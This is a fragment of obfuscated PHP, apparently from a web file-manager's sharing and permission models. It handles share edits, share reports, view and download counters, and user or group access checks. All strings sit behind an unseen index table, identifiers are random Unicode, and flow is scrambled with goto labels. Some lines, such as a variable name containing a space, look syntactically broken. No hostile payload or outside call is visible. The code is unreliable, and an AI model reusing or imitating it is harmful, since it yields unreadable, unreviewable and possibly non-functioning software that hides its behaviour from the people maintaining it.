if ($D == 0) { $F = array($bԭ[28] => get_path_this($F[$bԭ[76]])); } else { $F = Model($bԭ[793])->sourceInfo($D); if (!$F) { return !1; } } if (!$F[$bԭ[1435]]) { $F[$bԭ[1435]] = $F[$bԭ[28]]; } goto E˿; b: } private function _shareAuthSet($Eߨ, $D֮) { goto fߡ; E: return $f->addAll($D, array(), !0); goto b; c̲Ρ: $f->where(array($C[468] => $Eߨ))->delete(); $D = array(); foreach ($D֮ as $d򤯆) { $Fو = SourceModel::TYPE_USER; if ($d򤯆[$C[404]] == SourceModel::TYPE_GROUP) { $Fو = SourceModel::TYPE_GROUP; } $eǒ = array($C[468] => $Eߨ, $C[404] => $Fو, $C[484] => intval($d򤯆[$C[484]]), $C[1790] => 0, $C[1844] => -1); if ($d򤯆[$C[1790]]) { $eǒ[$C[1790]] = $d򤯆[$C[1790]]; } else { if ($d򤯆[$C[1844]]) { $eǒ[$C[1844]] = $d򤯆[$C[1844]]; } } $D[] = $eǒ; } goto E; fߡ: $C =& $_SERVER[̉]; if (!is_array($D֮)) { return !1; } $f = Model($C[1794]); goto c̲Ρ; b: } public function numViewAdd($dǳ˒) { $F򺹯Փ =& $_SERVER[̉]; $d🔶 = array($F򺹯Փ[467] => $dǳ˒); $this->where($d🔶)->setAdd($F򺹯Փ[1841]); } public function numDownloadAdd($Aꌊ) { $dх =& $_SERVER[̉]; $f = array($dх[467] => $Aꌊ); $this->where($f)->setAdd($dх[1842]); } protected function shareEdit($DʴɄ, $D) { goto eƼꈺ; D: if (isset($D[$Bԛ[1834]])) { $this->_shareAuthSet($DʴɄ, $D[$Bԛ[1834]]); } return !0; goto bבГ; C: $this->_checkLinkShare($D, $C睈Ʒ); $b޼ = array(); $Cã = explode($Bԛ[47], $Bԛ[1845]); goto bϞ; bϞ: foreach ($Cã as $B) { if (!array_key_exists($B, $D)) { continue; } $b޼[$B] = $D[$B]; } $this->shareEventAdd($C睈Ʒ[$Bԛ[395]], $D, $Bԛ[1662]); $this->where(array($Bԛ[467] => $DʴɄ))->save($b޼); goto D; eƼꈺ: $Bԛ =& $_SERVER[̉]; $C睈Ʒ = $this->getInfo($DʴɄ); if (!$C睈Ʒ) { return !1; } goto C; bבГ: } private function _checkLinkShare($b摐, $e؟) { goto f򖂺; cؕ˒: if ($e؟[$Aƍ[85]][$Aƍ[29]] != $Aƍ[193]) { $dڷ = $this->_folderReport($BѴ); if (!$dڷ) { return; } show_json(LNG($Aƍ[1846]) . $Aƍ[1847] . $dڷ, !1); } $e = Model($Aƍ[793])->fileInfoGet($e؟[$Aƍ[85]][$Aƍ[395]]); if (!$e) { return; } goto dʑȻ; f򖂺: $Aƍ =& $_SERVER[̉]; if ($b摐[$Aƍ[473]] != $Aƍ[87]) { return; } $BѴ = $e؟[$Aƍ[85]][$Aƍ[395]]; goto cؕ˒; dʑȻ: $eۚ󎡛 = $this->shareFileMeta($e[$Aƍ[447]]); if (isset($eۚ󎡛[$Aƍ[372]]) && $eۚ󎡛[$Aƍ[372]] == $Aƍ[87]) { show_json(LNG($Aƍ[1848]), !1); } goto b̐; b̐: } private function _folderReport($eݰ) { goto dܦ; a: $F捾 = array($a[447] => array($a[7], $B), $a[487] => array($a[380], "\x25{$d¥}\x25"), $a[423] => 0); $d = Model($a[793])->where($F捾)->field($a[1850])->find(); if (!$d) { return !1; } goto Fԅ; dܦ: $a =& $_SERVER[̉]; $F捾 = array($a[447] => array($a[968], 0), $a[713] => 3); $B = Model($a[1849])->where($F捾)->field($a[447])->select(); goto a엹; a엹: if (!$B) { return !1; } $B = array_to_keyvalue($B, $a[33], $a[447]); $d¥ = $a[47] . $eݰ . $a[47]; goto a; e: $fӖ = array_to_keyvalue($A芞, $a[33], $a[28]); $fӖ[] = $d[$a[28]]; return implode($a[8], $fӖ); goto Dނ; Fԅ: $b񟎛 = substr($d[$a[487]], strpos($d[$a[487]], $d¥)); $F捾 = array($a[395] => array($a[7], trim($b񟎛, $a[47]))); $A芞 = Model($a[793])->where($F捾)->field($a[28])->select(); goto e; Dނ: } protected function remove($F↲Ɉ) { goto Bﮇ; Aǘ: for ($A֧ = 0; $A֧ < count($D); $A֧++) { $Cս = $this->getInfo($D[$A֧]); if ($Cս[$b˲[475]] == $b˲[87]) { Model($b˲[533])->eventShare($Cս[$b˲[395]], $b˲[1839]); } if ($Cս[$b˲[473]] == $b˲[87]) { Model($b˲[533])->eventShare($Cս[$b˲[395]], $b˲[1838]); } } return $Cʄ; goto D; F񢊔: $Cʄ = $this->where($B)->delete(); if ($Cʄ) { Model($b˲[564])->where(array($b˲[468] => $F↲Ɉ))->delete(); } $D = is_array($F↲Ɉ) ? $F↲Ɉ[1] : array($F↲Ɉ); goto Aǘ; Bﮇ: $b˲ =& $_SERVER[̉]; if (is_array($F↲Ɉ)) { $F↲Ɉ = array($b˲[7], $F↲Ɉ); } $B = array($b˲[468] => $F↲Ɉ); goto F񢊔; D: } protected function removeBySource($e㳻) { goto aѪ; aѪ: $fԆ =& $_SERVER[̉]; $d֊ݔ = array($fԆ[410] => array($fԆ[411], $e㳻)); $Eׯ = $this->field($fԆ[468])->where($d֊ݔ)->select(); goto Dģ; f: $this->where($d֊ݔ)->delete(); Model($fԆ[564])->where($d֊ݔ)->delete(); goto D; Dģ: $Eׯ = array_to_keyvalue($Eׯ, $fԆ[33], $fԆ[468]); if (!$Eׯ) { return; } $d֊ݔ = array($fԆ[467] => array($fԆ[411], $Eׯ)); goto f; D: } public function listAll($cӛ) { goto bÈ̷; C: if ($cӛ[$E[724]]) { $bע = $cӛ[$E[476]] ? $cӛ[$E[476]] : strtotime(date($E[1851])); $D[$E[194]] = array($E[331], array($cӛ[$E[724]], $bע)); } if ($cӛ[$E[29]]) { $D[$cӛ[$E[29]]] = 1; } else { $D[] = array($E[473] => array($E[968], 0), $E[475] => array($E[968], 0), $E[1828] => $E[1782]); } if ($cӛ[$E[1778]]) { $D[] = array($E[470] => $cӛ[$E[1778]], $E[1435] => array($E[380], "\45{$cӛ[$E[1778]]}\45"), $E[1828] => $E[1782]); } goto fؑ; fؑ: $e尽 = $this->_makeOrder()->where($D)->selectPage(20); if (empty($e尽[$E[367]])) { return array(); } $this->_listDataApply($e尽[$E[367]]); goto Aل; bÈ̷: $E =& $_SERVER[̉]; $D = array(); if ($cӛ[$E[1531]]) { $D[$E[1531]] = $cӛ[$E[1531]]; } goto C; Aل: return $e尽; goto cҨ; cҨ: } public function listDataApply($Dӟ) { $this->_listDataApply($Dӟ); return $Dӟ; } private function _listDataApply(&$aܹ) { goto A¢; a: unset($b»); $aܹ = array_values($aܹ); goto bÙ; eʘϡ: $cߑݡ = array_to_keyvalue($aܹ, $Aӊ[33], $Aӊ[395]); $D݋ = Model($Aӊ[793])->sourceListInfo($cߑݡ, !0); foreach ($aܹ as $Dˉ => &$b») { $c垒 = $b»[$Aӊ[1531]]; $b»[$Aӊ[1852]] = $aΰԤ[$c垒] ? $aΰԤ[$c垒] : !1; $B = $b»[$Aӊ[395]]; $b»[$Aӊ[85]] = $D݋[$B] ? $D݋[$B] : !1; if ($b»[$Aӊ[85]][$Aӊ[423]] == $Aӊ[87]) { unset($aܹ[$Dˉ]); } if ($b»[$Aӊ[85]] != $Aӊ[191] && !$b»[$Aӊ[85]]) { unset($aܹ[$Dˉ]); } } goto a; A¢: $Aӊ =& $_SERVER[̉]; $cŲ = array_to_keyvalue($aܹ, $Aӊ[33], $Aӊ[1531]); $aΰԤ = Model($Aӊ[506])->userListInfo(array_unique($cŲ)); goto eʘϡ; bÙ: } private function _makeOrder($A = '') { goto f; Fݛ: $fˎ̷Ƌ = Input::get($CѦ[435], $CѦ[7], $CѦ[416], $a); $aͅ = Input::get($CѦ[436], $CѦ[7], $CѦ[1853], array($CѦ[1777], $CѦ[430])); $aͅ = $fߊ[$aͅ]; goto Cҿڂ; Cҿڂ: $A = $A . "{$fˎ̷Ƌ}\x20{$aͅ}"; return $this->order($A); goto B↑; f: $CѦ =& $_SERVER[̉]; $a = array($CѦ[194], $CѦ[476], $CѦ[1841], $CѦ[1842]); $fߊ = array($CѦ[428] => $CѦ[429], $CѦ[430] => $CѦ[431]); goto Fݛ; B↑: } public function reportAdd($a̼) { $d =& $_SERVER[̉]; $D֏ = array($d[468] => $a̼[$d[468]], $d[1531] => USER_ID); if (Model($d[1849])->where($D֏)->find()) { return !1; } $c = array($d[468] => $a̼[$d[468]], $d[1435] => $a̼[$d[1435]], $d[395] => $a̼[$d[395]], $d[447] => $a̼[$d[447]], $d[1531] => USER_ID, $d[29] => $a̼[$d[29]], $d[431] => $a̼[$d[431]]); return Model($d[1849])->add($c); } public function reportList($fҌ) { goto Aֳʄ; dљʊ: if (isset($fҌ[$Fֺ[29]]) && in_array($fҌ[$Fֺ[29]], array($Fֺ[87], $Fֺ[1854], $Fֺ[1855], $Fֺ[1856], $Fֺ[1857]))) { $aʛ⨤[$Fֺ[29]] = $fҌ[$Fֺ[29]]; } if (isset($fҌ[$Fֺ[713]]) && in_array($fҌ[$Fֺ[713]], array($Fֺ[191], $Fֺ[87], $Fֺ[1854], $Fֺ[1855]))) { $aʛ⨤[$Fֺ[713]] = $fҌ[$Fֺ[713]]; } $dȒ = Input::get($Fֺ[436], $Fֺ[7], $Fֺ[1853], array($Fֺ[1777], $Fֺ[430])); goto C܊; Aֳʄ: $Fֺ =& $_SERVER[̉]; $aʛ⨤ = array(); if ($fҌ[$Fֺ[724]]) { $A = $fҌ[$Fֺ[476]] ? $fҌ[$Fֺ[476]] : strtotime(date($Fֺ[1851])); $aʛ⨤[$Fֺ[194]] = array($Fֺ[331], array($fҌ[$Fֺ[724]], $A)); } goto dљʊ; f͖: $this->_listDataApply($A¯˅[$Fֺ[367]]); return $A¯˅; goto C; B캅: if (empty($A¯˅[$Fֺ[367]])) { return array(); } $b = array_to_keyvalue_group($A¯˅[$Fֺ[367]], $Fֺ[713], $Fֺ[468]); if (!empty($b[0])) { $fҌ = $b[0]; $aʛ⨤ = array($Fֺ[468] => array($Fֺ[7], $fҌ)); $bݭ = $this->where($aʛ⨤)->field($Fֺ[468])->select(); $bݭ = array_to_keyvalue($bݭ, $Fֺ[33], $Fֺ[468]); $b儼 = array_diff($fҌ, $bݭ); if (!empty($b儼)) { foreach ($A¯˅[$Fֺ[367]] as $C => $Aي) { if (in_array($Aي[$Fֺ[468]], $b儼)) { unset($A¯˅[$Fֺ[367]][$C]); } } } } goto f͖; C܊: $AՄ = array($Fֺ[428] => $Fֺ[429], $Fֺ[430] => $Fֺ[431]); $f = $Fֺ[1858] . $AՄ[$dȒ]; $A¯˅ = Model($Fֺ[1849])->where($aʛ⨤)->order($f)->selectPage(20); goto B캅; C: } public function reportStatus($E׺) { goto b᾵; bӞ: return $D·; goto BĹ; EΨ: $D· = Model($aģ[1849])->where($d)->save($eҾ); if ($E׺[$aģ[713]] == $aģ[1854]) { if ($e[$aģ[447]] != $aģ[191] && $this->shareFileMeta($e[$aģ[447]])) { $this->shareFileMeta($e[$aģ[447]], 0); } $this->remove($e[$aģ[468]]); return !0; } if ($D· && $E׺[$aģ[713]] == $aģ[1855]) { $f㠡 = $eҾ[$aģ[713]] == $aģ[1855] ? 1 : 0; $this->shareFileMeta($e[$aģ[447]], $f㠡); $this->removeByFile($e[$aģ[447]]); } goto bӞ; B: if (!$e) { return !1; } $eҾ = array($aģ[713] => $E׺[$aģ[713]]); if ($E׺[$aģ[713]] == $aģ[1855] && $e[$aģ[713]] == $aģ[1855]) { $eҾ[$aģ[713]] = 0; } goto EΨ; b᾵: $aģ =& $_SERVER[̉]; $d = array($aģ[393] => $E׺[$aģ[393]]); $e = Model($aģ[1849])->where($d)->field($aģ[1859])->find(); goto B; BĹ: } private function removeByFile($e) { goto bÅ; cݥ: $bΠВ = array_to_keyvalue($D, $B[33], $B[468]); $this->remove($bΠВ); goto Fƿ; bÅ: $B =& $_SERVER[̉]; $D = Model($B[793])->where(array($B[447] => $e))->field($B[395])->select(); $F = array_to_keyvalue($D, $B[33], $B[395]); goto Cٍ; Cٍ: $eҞ = array($B[395] => array($B[7], $F), $B[473] => 1); $D = $this->where($eҞ)->field($B[468])->select(); if (empty($D)) { return; } goto cݥ; Fƿ: } private function shareFileMeta($C՗ƶ, $A羧 = null) { $dخ˛ =& $_SERVER[̉]; $Cؑ֔ = array($dخ˛[447] => $C՗ƶ, $dخ˛[93] => $dخ˛[1860]); if (is_null($A羧)) { return Model($dخ˛[1861])->where($Cؑ֔)->find(); } $Cؑ֔[$dخ˛[372]] = $A羧; Model($dخ˛[1861])->add($Cؑ֔, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\137\163\x6f\165\x72\x63\x65\137\x61\x75\x74\x68"; public function getAuth($B) { goto c׫߉; c׫߉: $aĪ =& $_SERVER[̉]; $B = $this->sourceAuthSelect($B); $Aқ = array(); goto F; f݂: array_multisort($Fӭ, SORT_DESC, $Aқ); return $Aқ; goto f; F: $Fӭ = array(); $f = 2 << 25; foreach ($B as $d) { goto Aք; dʭ: $Aʦ = 0; if ($d[$aĪ[404]] == SourceModel::TYPE_GROUP) { $Aʦ = $f * 2; } if ($d[$aĪ[404]] == SourceModel::TYPE_USER) { $Aʦ = $f; } goto A; A: if ($d[$aĪ[404]] == SourceModel::TYPE_USER && $d[$aĪ[484]] == $aĪ[191]) { $Aʦ = 0; } $Fӭ[] = $fވ[$aĪ[406]] + $Aʦ; goto bʻՉ; Aք: $fވ = Model($aĪ[1862])->listData($d[$aĪ[1790]]); if (!$fވ) { continue; } $Aқ[] = $d; goto dʭ; bʻՉ: } goto f݂; f: } public function sourceAuthSelect($b) { goto Eۥ; eֻ: $AŨ = $this->field($Bğۃ)->order($a˝[393])->where($e֢𒏣)->select(); $Dճڸݸ = array_to_keyvalue_group($AŨ, $a˝[395]); foreach ($b as $CȔ) { $BŎ[$CȔ] = $Dճڸݸ[$CȔ] ? $Dճڸݸ[$CȔ] : array(); } goto aϟ; aϟ: if ($cަ) { return $AŨ; } return $Dճڸݸ; goto Fդ; Eۥ: $a˝ =& $_SERVER[̉]; static $BŎ = array(); $cަ = is_array($b) ? !1 : !0; goto Eη; eߩ: if (count($aߨ) == count($b)) { return $cަ ? $aߨ[$b[0]] : $aߨ; } $Bğۃ = $a˝[1863]; $e֢𒏣 = array($a˝[395] => array($a˝[7], $b)); goto eֻ; Eη: if ($cަ) { $b = array($b); } $aߨ = array(); foreach ($b as $CȔ) { if (isset($BŎ[$CȔ])) { $aߨ[$CȔ] = $BŎ[$CȔ]; } } goto eߩ; Fդ: } public function setAuth($BҸ, $dÞ΢) { goto f޺; Dߠ蹞: if ($Cۘ != $EЅ³) { $b҈ = array($BФۭ[1695] => $Cۘ); $F = Model($BФۭ[1776])->field($BФۭ[1531])->where($b҈)->select(); $F = array_to_keyvalue($F, $BФۭ[33], $BФۭ[1531]); } $fϰ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $c٥ = array(); goto eʷ; d: if ($B߯Ʒ؏[$BФۭ[404]] != SourceModel::TYPE_GROUP) { return !1; } $EЅ³ = 1; $Cۘ = $B߯Ʒ؏[$BФۭ[484]]; goto Dߠ蹞; eʷ: foreach ($dÞ΢ as $aⴤ) { if (!in_array($aⴤ[$BФۭ[404]], $fϰ)) { show_json(LNG($BФۭ[1864]), !1); } if ($Cۘ != $EЅ³) { if ($aⴤ[$BФۭ[404]] == SourceModel::TYPE_GROUP) { } if ($aⴤ[$BФۭ[484]] != 0 && !in_array($aⴤ[$BФۭ[484]], $F)) { } } if ($aⴤ[$BФۭ[484]] == 0) { $aⴤ[$BФۭ[404]] = SourceModel::TYPE_USER; } $c٥[] = array($BФۭ[395] => $BҸ, $BФۭ[404] => intval($aⴤ[$BФۭ[404]]), $BФۭ[484] => intval($aⴤ[$BФۭ[484]]), $BФۭ[1790] => intval($aⴤ[$BФۭ[1790]]) ? intval($aⴤ[$BФۭ[1790]]) : 0, $BФۭ[1844] => intval($aⴤ[$BФۭ[1844]]) ? intval($aⴤ[$BФۭ[1844]]) : -1); } $this->where(array($BФۭ[410] => $BҸ))->delete(); $this->addAll($c٥); goto b; f޺: $BФۭ =& $_SERVER[̉]; $B߯Ʒ؏ = Model($BФۭ[1205])->sourceInfo($BҸ); if (!$B߯Ʒ؏) { return !1; } goto d; b: return !0; goto Cل; Cل: } public function authClear($a܂ԯ) { $eڠ =& $_SERVER[̉]; $EɥӘ = Model($eڠ[1205])->sourceInfo($a܂ԯ); $f = array($a܂ԯ); if ($EɥӘ[$eڠ[403]] == $eڠ[87]) { $A = array($eڠ[553] => array($eڠ[512], $EɥӘ[$eڠ[487]] . $a܂ԯ . $eڠ[513])); $f = Model($eڠ[1205])->field($eڠ[410])->where($A)->getField($eڠ[395], !0); $f[] = $a܂ԯ; } $this->where(array($eڠ[410] => array($eڠ[411], $f)))->delete(); return !0; } public function getAllChildren($E뱦) { goto a; f: if ($dӏ܇[$aݢ[478]] == $aݢ[191] && $dӏ܇[$aݢ[484]] != $eÓ) { $B = $this->groupChidldAllRootSource($dӏ܇[$aݢ[484]]); } $b瑡 = $this->field($aݢ[395])->group($aݢ[395])->select(); $b瑡 = array_to_keyvalue($b瑡, $aݢ[33], $aݢ[395]); goto CɆ݉; a: $aݢ =& $_SERVER[̉]; $dӏ܇ = Model($aݢ[1205])->sourceInfo($E뱦); if ($dӏ܇[$aݢ[403]] != $aݢ[87]) { return $this->sourceListAuth(array($E뱦)); } goto B،; B،: if ($dӏ܇[$aݢ[404]] != SourceModel::TYPE_GROUP) { return array(); } $eÓ = 1; $B = array($E뱦); goto f; A޻: return $this->sourceListAuth($DＴ); goto cڥ; CɆ݉: if (!$b瑡) { return array(); } $EԂǏ = $aݢ[1865]; $E = array($aݢ[395] => array($aݢ[7], $b瑡), $aݢ[423] => $aݢ[191]); goto e稢ع; e稢ع: $B = Model($aݢ[793])->field($EԂǏ)->where($E)->select(); $DＴ = array($E뱦); foreach ($B as $Dś) { foreach ($B as $D麝) { $FΖ = $aݢ[47] . $D麝 . $aݢ[47]; $Bᑽ = $Dś[$aݢ[487]] . $Dś[$aݢ[395]] . $aݢ[47]; if (strstr($Bᑽ, $FΖ)) { $DＴ[] = $Dś[$aݢ[395]]; break; } } } goto A޻; cڥ: } private function sourceListAuth($B繄) { goto Bӟ; E: $d䳬 = array(); $D퉞 = array(); foreach ($dلȇ as $a) { goto A㗛; fݺƍ: unset($a[$C[85]]); $bϨ = $cݶ[$a[$C[395]]]; if (!$bϨ) { continue; } goto fԥ; A͆: $B = count(explode($C[8], trim($a[$C[495]], $C[8]))); $D퉞[] = $B + ($a[$C[29]] == $C[77] ? 0 : 1000); goto f; A㗛: unset($a[$C[434]]); unset($a[$C[432]]); unset($a[$C[406]]); goto fݺƍ; fԥ: $a[$C[1866]] = $this->authTargetInfo($bϨ); $a[$C[495]] = rtrim($a[$C[490]], $C[8]) . $C[8] . ltrim($a[$C[495]], $C[8]); $d䳬[] = $a; goto A͆; f: } goto fƫ; fƫ: array_multisort($D퉞, SORT_ASC, $d䳬); return $d䳬; goto c֊; Bӟ: $C =& $_SERVER[̉]; $dلȇ = Model($C[1205])->sourceListInfo($B繄, !0); $cݶ = $this->sourceAuthSelect($B繄); goto E; c֊: } private function groupChidldAllRootSource($BԌщ锥) { $b =& $_SERVER[̉]; $FϷ = Model($b[1867])->groupChildrenAll($BԌщ锥); $C = array($b[478] => 0, $b[484] => array($b[7], $FϷ), $b[404] => SourceModel::TYPE_GROUP); $cܔ֒ = Model($b[793])->field($b[395])->where($C)->select(); $cܔ֒ = array_to_keyvalue($cܔ֒, $b[33], $b[395]); return $cܔ֒; } private function authTargetInfo($Bʾ) { goto b؊; cӃ: $cŴƌ = 2 << 25; foreach ($Bʾ as $c͔) { goto b±; bӥ: $a = 0; if ($c͔[$eҷ[404]] == SourceModel::TYPE_GROUP) { $a = $cŴƌ * 2; } if ($c͔[$eҷ[404]] == SourceModel::TYPE_USER) { $a = $cŴƌ; } goto aǿƏ; b±: $Fǖ = Model($eҷ[1862])->listData($c͔[$eҷ[1790]]); if (!$Fǖ) { continue; } if ($c͔[$eҷ[404]] == SourceModel::TYPE_USER) { $c΃ɇی = Model($eҷ[502])->getInfoSimpleOuter($c͔[$eҷ[484]]); if ($c΃ɇی[$eҷ[1531]] == $eҷ[1084]) { continue; } if ($c΃ɇی[$eҷ[1531]] == $eҷ[191]) { $c΃ɇی[$eҷ[28]] = LNG($eҷ[1868]); } } else { $c΃ɇی = Model($eҷ[486])->getInfoSimple($c͔[$eҷ[484]]); } goto cص; cص: if (!$c΃ɇی) { continue; } $c΃ɇی[$eҷ[446]] = $Fǖ; $B⾦[] = $c΃ɇی; goto bӥ; aǿƏ: if ($c͔[$eҷ[404]] == SourceModel::TYPE_USER && $c͔[$eҷ[484]] == $eҷ[191]) { $a = 0; } $C[] = $Fǖ[$eҷ[406]] + $a; goto Cݷ؈; Cݷ؈: } array_multisort($C, SORT_DESC, $B⾦); goto d속˒; d속˒: return $B⾦; goto aܪ; b؊: $eҷ =& $_SERVER[̉]; $B⾦ = array(); $C = array(); goto cӃ; aܪ: } public function getAllChildrenByUser($BƟá, $Fѩ) { goto f; f: $e㝼 =& $_SERVER[̉]; $eБ = Model($e㝼[506])->getInfo($Fѩ); if (!$Fѩ || !$BƟá || !$eБ) { return array(); } goto EР; EР: $c找 = Model($e㝼[1205])->sourceInfo($BƟá); $B = array(); $dמ = 1; goto f󩷐; f󩷐: if ($c找[$e㝼[478]] == $e㝼[191] && $c找[$e㝼[484]] != $dמ && $this->groupContainUser($c找[$e㝼[484]], $Fѩ)) { foreach ($eБ[$e㝼[1869]] as $A) { $a = Model($e㝼[486])->getInfo($A[$e㝼[1695]]); $a ᰾ = Model($e㝼[506])->getInfoSimpleOuter($Fѩ); $a ᰾[$e㝼[446]] = $A[$e㝼[406]]; if (Model($e㝼[1862])->authCheckAction($A[$e㝼[406]][$e㝼[406]], $e㝼[1715])) { continue; } $d = array($e㝼[28] => $e㝼[1484] . $a[$e㝼[28]], $e㝼[395] => $a[$e㝼[85]][$e㝼[395]], $e㝼[76] => KodIO::make($a[$e㝼[85]][$e㝼[395]]), $e㝼[478] => $e㝼[191], $e㝼[404] => $e㝼[1014], $e㝼[29] => $e㝼[517], $e㝼[495] => $a[$e㝼[491]], $e㝼[1695] => $a[$e㝼[1695]], $e㝼[488] => $a[$e㝼[478]], $e㝼[1866] => array($a ᰾)); $B[$d[$e㝼[395]]] = $d; } } $D = array(); $aˣɧ = $this->getAllChildren($BƟá); goto F; fȟ: return $D; goto D߅ݤ; F: foreach ($aˣɧ as $e) { $cҴ܇ۋ = !1; foreach ($e[$e㝼[1866]] as $aˣ̪) { if ($aˣ̪[$e㝼[1531]]) { if ($aˣ̪[$e㝼[1531]] == $Fѩ) { $cҴ܇ۋ = !0; break; } } if ($aˣ̪[$e㝼[1695]]) { if ($this->groupContainUser($aˣ̪[$e㝼[1695]], $Fѩ)) { $cҴ܇ۋ = !0; break; } } } if ($cҴ܇ۋ) { $D[] = $e; } $bܭь = $e[$e㝼[395]]; if (isset($B[$bܭь])) { $e[$e㝼[1866]][] = $B[$bܭь][0]; $B[$bܭь] = !1; } } $B = array_filter(array_values($B)); $D = array_merge($B, $D); goto fȟ; D߅ݤ: } public function setAllChildrenByUser($AŔ, $Dغ, $cӣ) { $E쌆 =& $_SERVER[̉]; $a = $this->getAllChildrenByUser($AŔ, $Dغ); if (!$cӣ || !$a) { return !1; } foreach ($a as $A) { $A졭 = array(); foreach ($A[$E쌆[1866]] as $Bǌ) { $Bͫ = $Bǌ[$E쌆[446]]; $aҷ = $Bǌ[$E쌆[1531]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $dǎ = $Bǌ[$E쌆[1531]] ? $Bǌ[$E쌆[1531]] : $Bǌ[$E쌆[1695]]; if ($Bǌ[$E쌆[1531]] && $Bǌ[$E쌆[1531]] == $Dغ) { continue; } $A졭[] = array($E쌆[395] => $A[$E쌆[395]], $E쌆[404] => $aҷ, $E쌆[484] => intval($dǎ), $E쌆[1790] => isset($Bͫ[$E쌆[393]]) ? intval($Bͫ[$E쌆[393]]) : 0, $E쌆[1844] => isset($Bͫ[$E쌆[1844]]) ? intval($Bͫ[$E쌆[1844]]) : -1); } $A졭[] = array($E쌆[395] => $A[$E쌆[395]], $E쌆[404] => SourceModel::TYPE_USER, $E쌆[484] => intval($Dغ), $E쌆[1790] => intval($cӣ), $E쌆[1844] => -1); $this->where(array($E쌆[410] => $A[$E쌆[395]]))->delete(); $this->addAll($A졭); } return !0; } public function get($c͔) { $cˊ = $this->getSourceList(array($c͔), !0); return $cˊ[0]; } public function getSourceList($a߽, $F㬥 = false, $cԿ = false) { goto f; f: $d =& $_SERVER[̉]; if (!$a߽) { return array(); } $f␝ = Model($d[1205]); goto Aړ; E٭ή: $b = $this->userIsRoot($cԿ); $F軫 = AuthModel::authAll(); $aŗ = array($d[407] => $F軫, $d[1871] => array($d[412] => 0, $d[1701] => $F軫, $d[413] => LNG($d[1872]), $d[1716] => $d[1873])); goto e; f٭: $Aҟ⒥ = $this->sourceAuthSelect($e); $fӐ = array(); foreach ($e as $a) { if (isset($Aҟ⒥[$a])) { $fӐ[$a] = $Aҟ⒥[$a]; } } goto E٭ή; bϐ॔: foreach ($F㬥 as $fۇ => $e䐐) { $f̥ͤ = $f␝->parentLevelArray($e䐐[$d[487]]); $e = array_merge($e, array($fۇ), array_reverse($f̥ͤ)); } $e = array_values(array_unique($e)); if (!$e) { return array(); } goto f٭; e: $CϤ = array(); foreach ($F㬥 as $a => $E竻) { if ($b) { $CϤ[$a] = $aŗ; continue; } $CϤ[$a] = $this->makeSourceAuth($E竻, $fӐ, $cԿ); } return $CϤ; goto a̘޿; Aړ: if (!$F㬥 && count($a߽) == 1) { $F㬥 = array(); $F㬥[$a߽[0]] = $f␝->sourceInfo($a߽[0]); } if (!$F㬥) { $E = array($d[410] => array($d[411], $a߽)); $F㬥 = $f␝->field($d[1870])->where($E)->select(); $F㬥 = array_to_keyvalue($F㬥, $d[395]); } $e = $a߽; goto bϐ॔; a̘޿: } public function authDeepCheck($d؏, $b⡅Ӎ = false) { goto c; eɺ: if (!$b) { return !1; } $fǃĄ = $b ? $b[0] : $d؏; return array($F[407] => -1, $F[446] => array($F[412] => $F[1084], $F[1701] => $F[191], $F[413] => LNG($F[1876]), $F[1716] => $F[1877]), $F[1878] => LNG($F[1879]), $F[1880] => $this->sourceAuthInfo($fǃĄ)); goto Fڜզ; c: $F =& $_SERVER[̉]; $b⡅Ӎ = $b⡅Ӎ ? $b⡅Ӎ : USER_ID; $F = $this->makeAuthDeep($b⡅Ӎ); goto Eǻ; Eǻ: if (!in_array($d؏, $F[$F[1874]])) { return !1; } $b = array(); foreach ($F[$F[1875]] as $B => $Bݨ) { if (!in_array($d؏, $Bݨ)) { continue; } $b[] = $B; } goto eɺ; Fڜզ: } protected function makeAuthDeep($fԕ = false) { goto Aෆ҇; D: foreach ($F as $eЃ) { if ($eЃ[$bψ[406]] == 0 && $eЃ[$bψ[1717]] == $bψ[87]) { $fˈƜ[] = $eЃ[$bψ[393]]; } } $bᕉ = $this->userGroupParents($fԕ); $c؍ = array($bψ[404] => SourceModel::TYPE_USER, $bψ[484] => $fԕ); goto B; Aෆ҇: $bψ =& $_SERVER[̉]; static $F۴ = array(); $fԕ = $fԕ ? $fԕ : USER_ID; goto Eʟ; cݏ: $e˴ = array(); $F㏾ = array(); $BԶՎˏ = array(); goto B긛; Eʟ: if (isset($F۴[$fԕ])) { return $F۴[$fԕ]; } $F = Model($bψ[1881])->listData(); $fˈƜ = array(); goto D; B: if ($bᕉ) { $c؍ = array(array($bψ[404] => SourceModel::TYPE_USER, $bψ[484] => $fԕ), array($bψ[404] => SourceModel::TYPE_GROUP, $bψ[484] => array($bψ[411], $bᕉ)), $bψ[956] => $bψ[1782]); } $AǕ = $this->field($bψ[1882])->where($c؍)->select(); $C = array(); goto fы; c͞ʡ: $fի = $bᕉ; $eߟ = Model($bψ[1205]); $fቫ = Model($bψ[486]); goto cݏ; EǈݸƟ: $B˪ = array($bψ[1874] => $C, $bψ[1875] => $e˴); $F۴[$fԕ] = $B˪; return $B˪; goto Fȟұ; B긛: $bǑ = array(); if ($C) { $c = $eߟ->where(array($bψ[395] => array($bψ[411], $C)))->select(); foreach ($c as $f쟄) { $Eϵ = $eߟ->parentLevelArray($f쟄[$bψ[487]]); $C = array_merge($C, $Eϵ); $fի[] = $f쟄[$bψ[484]]; $e˴[$f쟄[$bψ[395]]] = $Eϵ; $F㏾[$f쟄[$bψ[395]]] = $f쟄[$bψ[484]]; } } $fի = array_values(array_unique($fի)); goto eӵ; fы: $eᏫ̬ = array_to_keyvalue_group($AǕ, $bψ[395]); foreach ($eᏫ̬ as $cÔѯ => $B) { $BƦ = $this->authArrayCheck($B, $fԕ); if ($BƦ[$bψ[407]] > 0) { $C[] = $cÔѯ . $bψ[33]; } } $C = array(); goto c͞ʡ; eӵ: $bş = $fի; foreach ($bş as $EŎʟ) { $dҎ = $fቫ->getInfo($EŎʟ); $Eϵ = $eߟ->parentLevelArray($dҎ[$bψ[487]]); $fի = array_merge($fի, $Eϵ); } $fի = array_values(array_unique($fի)); goto dƃ; dƃ: foreach ($fի as $EŎʟ) { $dҎ = $fቫ->getInfo($EŎʟ); $C[] = $dҎ[$bψ[85]][$bψ[395]]; $BԶՎˏ[$EŎʟ] = $dҎ[$bψ[85]][$bψ[395]]; $bǑ[$EŎʟ] = $eߟ->parentLevelArray($dҎ[$bψ[487]]); } foreach ($e˴ as $B => $eʍ) { $c = $F㏾[$B]; if (!$c || !$BԶՎˏ[$c]) { continue; } 